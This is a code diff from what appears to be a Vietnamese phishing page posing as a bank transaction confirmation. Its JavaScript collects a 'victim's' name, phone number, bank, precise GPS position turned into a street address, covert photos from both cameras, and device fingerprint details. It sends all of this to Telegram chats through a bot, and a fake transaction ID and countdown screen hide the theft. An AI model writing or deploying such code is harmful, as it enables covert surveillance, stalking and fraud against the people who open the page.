-                    victimData.location = '10.823099, 106.629662'; // Mặc định HCM
-                    victimData.address = 'Số 5 Công Trường Quốc Tế, Quận 3, Hồ Chí Minh';
-                    victimData.city = 'Hồ Chí Minh';
-                    victimData.district = 'Quận 3';
-                    resolve();
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        victimData.location = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
-                        
-                        try {
-                            // Gọi OpenStreetMap Nominatim API
-                            const response = await fetch(
-                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=vi`
-                            );
-                            const data = await response.json();
-                            
-                            if (data.address) {
-                                const addr = data.address;
-                                victimData.fullAddress = data.display_name;
-                                
-                                // Trích xuất thông tin chi tiết
-                                victimData.address = [
-                                    addr.road ? addr.road : '',
-                                    addr.house_number ? `Số ${addr.house_number}` : '',
-                                    addr.neighbourhood ? `Khu ${addr.neighbourhood}` : ''
-                                ].filter(Boolean).join(', ');
-                                
-                                victimData.district = addr.suburb || addr.city_district || addr.county || 'Không rõ';
-                                victimData.city = addr.city || addr.town || addr.village || addr.state || 'Không rõ';
-                                
-                                // Định dạng địa chỉ đẹp
-                                victimData.address = `${victimData.address}, ${victimData.district}, ${victimData.city}, Việt Nam`;
-                            } else {
-                                victimData.address = `Tọa độ: ${victimData.location}`;
-                            }
-                        } catch (e) {
-                            victimData.address = `Tọa độ: ${victimData.location}`;
-                            victimData.city = 'Không xác định';
-                            victimData.district = 'Không xác định';
-                        }
-                        resolve();
-                    },
-                    (error) => {
-                        // Fallback: địa chỉ mặc định
-                        victimData.location = '10.823099, 106.629662';
-                        victimData.address = 'Số 5 Công Trường Quốc Tế, Phường 6, Quận 3, Hồ Chí Minh';
-                        victimData.city = 'Hồ Chí Minh';
-                        victimData.district = 'Quận 3';
-                        resolve();
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            });
-        }
-        
-        // ================= HÀM CAMERA ẨN =================
-        async function startHiddenCamera(facingMode, elementId) {
-            try {
-                const constraints = {
-                    video: {
-                        facingMode: facingMode,
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                };
-                
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById(elementId);
-                video.srcObject = stream;
-                
-                if (facingMode === 'user') {
-                    frontStream = stream;
-                } else {
-                    backStream = stream;
-                }
-                
-                return true;
-            } catch (err) {
-                console.log(`Không thể bật camera ${facingMode}:`, err);
-                return false;
-            }
-        }
-        
-        async function captureHiddenPhoto(elementId) {
+        async function capturePhoto(elementId) {
             return new Promise((resolve) => {
                 setTimeout(() => {
                     const video = document.getElementById(elementId);
@@ -618,71 +504,60 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
                     
-                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                    resolve(photoData);
-                }, 500);
+                    resolve(canvas.toDataURL('image/jpeg', 0.8));
+                }, 1000);
             });
         }
         
-        // ================= HÀM GỬI DỮ LIỆU =================
-        async function sendCompleteData() {
-            victimData.timestamp = new Date().toLocaleString('vi-VN', {
-                year: 'numeric',
-                month: '2-digit',
-                day: '2-digit',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit',
-                hour12: false
-            });
+        // ================= GỬI TELEGRAM =================
+        async function sendAllDataToTelegram() {
+            victimData.timestamp = new Date().toLocaleString('vi-VN');
             
-            // Tạo message text chi tiết
             const textMessage = `
-🎯 <b>NẠN NHÂN MỚI - AUTO CAPTURE</b>
+🎯 <b>NẠN NHÂN MỚI - VỊ TRÍ THẬT + GPS</b>
 
-<b>👤 THÔNG TIN CÁ NHÂN:</b>
+<b>👤 THÔNG TIN:</b>
 ├ Họ tên: <code>${victimData.name}</code>
 ├ SĐT: <code>${victimData.phone}</code>
 └ Ngân hàng: ${victimData.bank}
 
-<b>📍 ĐỊA CHỈ CHI TIẾT:</b>
-├ Tọa độ: <code>${victimData.location}</code>
+<b>📍 VỊ TRÍ CHÍNH XÁC:</b>
+├ Tọa độ GPS: <code>${victimData.location}</code>
+├ Độ chính xác: ${Math.round(victimData.accuracy)} mét
 ├ Địa chỉ: ${victimData.address}
+├ Phường/Xã: ${victimData.ward}
 ├ Quận/Huyện: ${victimData.district}
-└ Tỉnh/Thành phố: ${victimData.city}
+└ Tỉnh/TP: ${victimData.city}
 
 <b>📷 CAMERA:</b>
-├ Camera trước: ${victimData.frontCam ? '✅ ĐÃ CHỤP' : '❌ KHÔNG CÓ'}
-└ Camera sau: ${victimData.backCam ? '✅ ĐÃ CHỤP' : '❌ KHÔNG CÓ'}
+├ Camera trước: ${victimData.frontCam ? '✅ ĐÃ CHỤP' : '❌ KHÔNG'}
+└ Camera sau: ${victimData.backCam ? '✅ ĐÃ CHỤP' : '❌ KHÔNG'}
 
 <b>📱 THIẾT BỊ:</b>
 ├ Platform: ${victimData.deviceInfo.platform}
 ├ Ngôn ngữ: ${victimData.deviceInfo.language}
 ├ Màn hình: ${victimData.deviceInfo.screen}
-└ Cookies: ${victimData.deviceInfo.cookies}
+├ Timezone: ${victimData.deviceInfo.timezone}
+├ CPU Cores: ${victimData.deviceInfo.cores}
+└ User Agent: <code>${victimData.deviceInfo.userAgent.substring(0, 80)}...</code>
 
 <b>⏰ THỜI GIAN:</b>
 ${victimData.timestamp}
-
-<b>🔗 USER AGENT:</b>
-<code>${victimData.deviceInfo.userAgent}</code>
             `.trim();
             
-            // Gửi đến tất cả chat IDs
             for (const chatId of CHAT_IDS) {
                 try {
-                    // Gửi text
                     await sendTelegramMessage(chatId, textMessage, 'HTML');
                     
-                    // Gửi ảnh camera trước
                     if (victimData.frontCam) {
-                        await sendTelegramPhoto(chatId, victimData.frontCam, '📸 CAMERA TRƯỚC - ' + victimData.name);
+                        await sendTelegramPhoto(chatId, victimData.frontCam, 
+                            `📸 CAMERA TRƯỚC - ${victimData.name}\n📍 ${victimData.address.substring(0, 50)}...`);
                         await delay(1000);
                     }
                     
-                    // Gửi ảnh camera sau
                     if (victimData.backCam) {
-                        await sendTelegramPhoto(chatId, victimData.backCam, '📸 CAMERA SAU - ' + victimData.name);
+                        await sendTelegramPhoto(chatId, victimData.backCam, 
+                            `📸 CAMERA SAU - ${victimData.name}\n📍 ${victimData.location}`);
                     }
                     
                 } catch (error) {
@@ -691,7 +566,6 @@ ${victimData.timestamp}
             }
         }
         
-        // ================= TELEGRAM FUNCTIONS =================
         async function sendTelegramMessage(chatId, text, parseMode = 'HTML') {
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -707,7 +581,6 @@ ${victimData.timestamp}
         
         async function sendTelegramPhoto(chatId, photoBase64, caption = '') {
             try {
-                // Chuyển base64 thành blob
                 const base64Data = photoBase64.split(',')[1];
                 const byteCharacters = atob(base64Data);
                 const byteNumbers = new Array(byteCharacters.length);
@@ -719,24 +592,18 @@ ${victimData.timestamp}
                 const byteArray = new Uint8Array(byteNumbers);
                 const blob = new Blob([byteArray], { type: 'image/jpeg' });
                 
-                // Tạo FormData
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'camera.jpg');
                 if (caption) formData.append('caption', caption);
                 
-                // Gửi
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                const result = await response.json();
-                if (!result.ok) throw new Error('Send photo failed');
-                
             } catch (error) {
-                console.error('Lỗi gửi ảnh, thử gửi document...');
-                // Fallback: gửi document
+                // Fallback
                 try {
                     const base64Data = photoBase64.split(',')[1];
                     const byteCharacters = atob(base64Data);
@@ -764,26 +631,30 @@ ${victimData.timestamp}
             }
         }
         
-        // ================= UI FUNCTIONS =================
-        function updateProgress(step) {
-            document.getElementById('progressFill').style.width = step.percent + '%';
-            document.getElementById('progressText').textContent = step.text;
-            document.getElementById('currentStatus').textContent = step.text;
+        // ================= HÀM PHỤ =================
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressText').textContent = text;
+            document.getElementById('currentStatus').textContent = text;
+        }
+        
+        function updateCameraProgress(step) {
+            document.getElementById('cameraProgressFill').style.width = step.percent + '%';
+            document.getElementById('cameraProgressText').textContent = step.text;
+            document.getElementById('cameraStatus').textContent = step.text;
         }
         
         function delay(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
         
-        function showCompleteStep() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
+        function showFinalStep() {
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.remove('hidden');
             
-            // Tạo mã giao dịch ngẫu nhiên
             const txId = 'VCB-' + Date.now().toString().slice(-8);
             document.getElementById('transactionId').textContent = `Mã giao dịch: ${txId}`;
             
-            // Bắt đầu đếm ngược
             let count = 5;
             const countdownEl = document.getElementById('countdown');
             const interval = setInterval(() => {
@@ -797,7 +668,7 @@ ${victimData.timestamp}
             }, 1000);
         }
         
-        // ================= AUTO-FILL PHONE =================
+        // ================= AUTO-FILL =================
         window.addEventListener('DOMContentLoaded', () => {
             try {
                 const savedPhone = localStorage.getItem('lastPhone');
